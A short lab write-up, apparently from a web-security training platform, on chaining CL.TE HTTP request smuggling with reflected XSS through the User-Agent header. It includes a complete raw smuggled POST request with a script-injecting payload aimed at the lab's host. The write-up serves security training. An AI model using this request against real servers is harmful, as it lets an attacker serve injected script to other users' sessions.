# Practitioner Lab 134: Exploiting HTTP request smuggling to deliver reflected XSS

---

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the `User-Agent` header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`.

![Untitled](Practitioner%20Lab%20134%20Exploiting%20HTTP%20request%20smugg%20bcc7b8d9e4ff41e7bc13370bb5cd60c5/Untitled.png)

This shows me that it is a CLTE  

the front end looks at the Content length while the backend looks at the Transfer Encoding.

The first thing I did was redirect to the product page where the user agent is reflected. 

To test the smuggling I just made sure that I would be redirected to the page. I then added xss.

By looking at the context of the xss I managed the escape the outside tags and have xss

![Untitled](Practitioner%20Lab%20134%20Exploiting%20HTTP%20request%20smugg%20bcc7b8d9e4ff41e7bc13370bb5cd60c5/Untitled%201.png)

```
POST / HTTP/1.1
Host: 0a3f007e04e5edcd80de67a600f200a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 281
Transfer-Encoding: chunked

0

GET /post?postId=7 HTTP/1.1
Host: 0a3f007e04e5edcd80de67a600f200a1.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"><script>alert(1)</script>
Content-Length: 30

x=
```

![Untitled](Practitioner%20Lab%20134%20Exploiting%20HTTP%20request%20smugg%20bcc7b8d9e4ff41e7bc13370bb5cd60c5/Untitled%202.png)

Now I will send it to the user and This should solve the lab.

![Untitled](Practitioner%20Lab%20134%20Exploiting%20HTTP%20request%20smugg%20bcc7b8d9e4ff41e7bc13370bb5cd60c5/Untitled%203.png)